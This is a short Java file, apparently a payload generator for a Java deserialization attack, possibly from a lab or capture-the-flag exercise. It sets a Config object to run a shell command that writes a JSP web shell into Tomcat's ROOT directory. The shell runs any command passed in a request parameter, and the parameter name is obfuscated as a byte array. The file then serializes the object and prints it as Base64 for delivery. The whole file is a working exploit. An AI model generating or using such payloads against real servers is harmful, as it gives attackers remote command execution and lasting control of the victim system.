package src.CommandExec;

import src.CommandExec.Config;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class ConfigTest {

    public static void main(String[] args) throws IOException {
        Config config = new Config();
        config.setArgs(new String[]{"/bin/sh","-c","echo '<%=Runtime.getRuntime().exec(request.getParameter(new String(new byte[]{97})))%>'>/usr/local/tomcat/webapps/ROOT/1.jsp"});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(config);

        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
        objectOutputStream.close();

    }
}